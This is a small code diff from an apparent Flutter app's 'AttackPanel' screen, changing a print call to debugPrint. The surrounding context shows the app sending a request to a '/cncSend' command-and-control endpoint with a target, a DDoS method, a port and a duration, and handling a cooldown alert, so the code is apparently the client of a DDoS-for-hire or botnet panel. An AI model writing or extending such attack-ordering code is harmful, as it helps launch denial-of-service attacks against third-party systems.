@@ -64,7 +64,7 @@ class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin
           "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
       final res = await http.get(uri);
       final data = jsonDecode(res.body);
-      print(data);
+      debugPrint(data);
 
       if (data["cooldown"] == true) {
         _showAlert("⏳ Cooldown", "Please wait a moment before sending again.");
